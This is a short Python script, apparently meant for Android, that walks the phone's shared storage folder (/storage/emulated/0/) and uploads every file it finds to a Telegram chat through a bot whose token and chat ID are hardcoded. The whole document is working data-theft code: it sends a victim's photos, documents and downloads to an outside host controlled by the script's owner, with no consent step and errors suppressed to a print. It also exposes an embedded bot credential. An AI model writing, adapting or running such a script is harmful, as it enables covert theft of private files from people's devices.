import os
import requests

BOT_TOKEN = "8694159518:AAF4O9s94rmrMcJ2xBbOf4Ov3-QErt64N8c"
CHAT_ID = "7708603881"

folder_path = "/storage/emulated/0/"

def send_file(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})

for root, dirs, files in os.walk(folder_path):
    for file in files:
        full_path = os.path.join(root, file)
        try:
            send_file(full_path)
        except Exception as e:
            print(f"Error: {e}")
